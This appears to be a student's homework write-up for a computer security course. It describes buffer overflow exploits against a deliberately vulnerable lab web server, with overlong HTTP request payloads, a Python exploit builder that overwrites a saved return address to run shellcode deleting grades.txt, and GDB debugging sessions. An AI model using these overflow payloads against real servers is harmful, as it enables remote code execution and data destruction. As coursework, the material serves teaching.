@@ -1,0 +1,155 @@
+#Class:Computer and Network Security-CCOM4995
+#Homework 2
+#Name: Ilian Torres Trinidad
+#Student#: 801-13-7738
+#Date:November 27,2017
+## Place your answers here.
+
+~~~~~[Exercise 2]~~~~~~~~~
+exploit-2a.py:
+trigger buffer overflow on line->[http.c:159]-> url_decode(value, sp);
+>>
+req =   "GET / HTTP/1.0\r\n" + \
+        "Accept: " +"A" *1024 + "\r\n"+\
+        "\r\n"
+will be stored in value which is(512 bytes) with the function 'url_decode'. 
+And 'value' will be out of bounds, which corrupt return address of function 'http_request_headers'.
+We can see this by running python exploit-2a.py localhost 8080:
+which gives:
+HTTP request:
+GET / HTTP/1.0
+Accept: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.........AAA
+Connecting to localhost:8080...
+Connected, sending request...
+Request sent, waiting for reply...
+Exception:
+Traceback (most recent call last):
+  File "exploit-2a.py", line 70, in <module>
+    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
+  File "exploit-2a.py", line 47, in send_req
+    rbuf = sock.recv(1024)
+error: [Errno 104] Connection reset by peer
+
+exploit-2b.py:
+trigger buffer overflow on line ->[http.c:282]-> strcat(pn, name);
+
+req "GET " + "a" *1012 will be stored in variable 'pn'(1024
+bytes) with function 'strcat' and it will "cat" name so if name is 1 byte it will overflow.
+'pn' will be out of bound, which will corrupt function pointer 'handler'.
+
+->run the server
+./clean-env.sh ./zookld zook-exstack.conf 
+->GDB
+httpd@vm-6858:~/lab$ gdb -p $(pgrep zookfs-exstack)
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+Attaching to process 1347
+Reading symbols from /home/httpd/lab/zookfs-exstack...done.
+Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.23.so...done.
+done.
+Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.23.so...done.
+done.
+0x40027c31 in __kernel_vsyscall ()
+(gdb) break http_request_headers
+Breakpoint 1 at 0x804904f: file http.c, line 124.
+(gdb) break http_request_line
+Breakpoint 2 at 0x8048e5d: file http.c, line 67.
+(gdb) break http_serve
+Breakpoint 3 at 0x8049498: file http.c, line 275.
+(gdb) continue
+Continuing.
+
+
+-> Run python script
+ 
+httpd@vm-6858:~/lab$ python exploit-2b.py localhost 8080
+
+
+-> back to GDB
+(gdb) next
+(gdb) step (step inside http_request_line)
+(gdb) continue
+~~~~~[Exercise 3]~~~~~~~~~ 
+Trigger the buff overflow value [http.c:159] to currupt the return address from 'http_request_headers'.
+ The return address is going to become the address of value which in this case will contain out shellcode grade.txt.
+In this exercise we construct an exploit that deletes grades.txt using the
+ http_request_headers function which calls the url_decode function. 
+We then overflow buf to overwrite the saves eip on the stack by placing shellcode in the buffer, therefore changing the saved eip so it can commence the sheelcode.
+
+how we did this:
+1st change the expliot template.
+
+stack_buffer = 0xbfffdbe4 #change to value address
+stack_saved_ebp = 0x12345678
+stack_retaddr = stack_saved_ebp + 4
+
+
+def build_exploit(shellcode):
+    ## Things that you might find useful in constructing your exploit:
+    ##   urllib.quote(s)
+    ##     returns string s with "special" characters percent-encoded
+    ##   struct.pack("<I", x)
+    ##     returns the 4-byte binary encoding of the 32-bit integer x
+    ##   variables for program addresses (ebp, buffer, retaddr=ebp+4)
+    specialChars = struct.pack("<I", stack_buffer)
+    recomendation=urllib.quote(shellcode)
+    #Calculate the hack find the value of eip (return address) - Value - shellcode
+    # eip(address->0xbfffddfe, value->3221216764)
+    # value (address->0xbfffdbe4,value ->3221216228)
+    #value of shellcode (64)
+    Hack='A'* 472 # Hack= 'a' * (3221216764-3221216228-64=474)
+    req =   "GET /" + " HTTP/1.0\r\n" + \
+            "Accept: " + recomendation + \
+            Hack + specialChars + "AAAA" + \
+            "\r\n"
+    return req
+
+->run the server
+./clean-env.sh ./zookld zook-exstack.conf
+->GDB
+gdb -p $(pgrep zookfs-exstack)
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word".
+Attaching to process 964
+Reading symbols from /home/httpd/lab/zookfs-exstack...done.
+Reading symbols from /lib/i386-linux-gnu/libc.so.6...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/libc-2.23.so...done.
+done.
+Reading symbols from /lib/ld-linux.so.2...Reading symbols from /usr/lib/debug//lib/i386-linux-gnu/ld-2.23.so...done.
+done.
+0x40027c31 in __kernel_vsyscall ()
+(gdb) b http_request_headers 
+Breakpoint 1 at 0x804904f: file http.c, line 124.
+(gdb) continue
+Continuing.
+
+->run exploit-3.py-> python exploit-3.py localhost 8080
+
+->back to gdb
+(gdb) b 159
+Breakpoint 2 at 0x8049174: file http.c, line 159.
+(gdb) continue
+Continuing.
